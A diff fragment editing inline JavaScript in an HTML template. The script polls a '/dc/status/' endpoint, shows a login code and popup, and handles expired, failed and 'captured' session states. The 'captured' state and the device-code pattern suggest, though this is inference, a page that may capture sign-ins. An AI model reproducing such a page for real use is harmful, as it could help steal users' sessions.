+window.refreshCode=refreshCode;
 
 function poll(){
 fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){
@@ -205,15 +748,24 @@ if(popup&&!popup.closed)popup.close();
 document.getElementById('mainView').style.display='none';
 document.getElementById('successView').style.display='block';
 }else if(d.failed){
-statusEl.textContent='Session expired. Please refresh to try again.';
-statusEl.style.color='#d83b01';
+statusEl.textContent='Session expired. Refresh to try again.';
+statusEl.className='status error';
 codeEl.textContent='—';
+btnEl.disabled=true;
+copyBtnEl.disabled=true;
 }else if(!d.expired){setTimeout(poll,codeReady?3000:600);}
+else if(d.expired && !d.captured && !d.failed){
+statusEl.textContent='Code expired. Click refresh to get a new one.';
+statusEl.className='status error';
+btnEl.disabled=true;
+copyBtnEl.disabled=true;
+}
 }).catch(function(){setTimeout(poll,3000);});
 }
 setTimeout(poll,codeReady?3000:400);
 })();
 </script>
+
 </body>
 </html>`
 
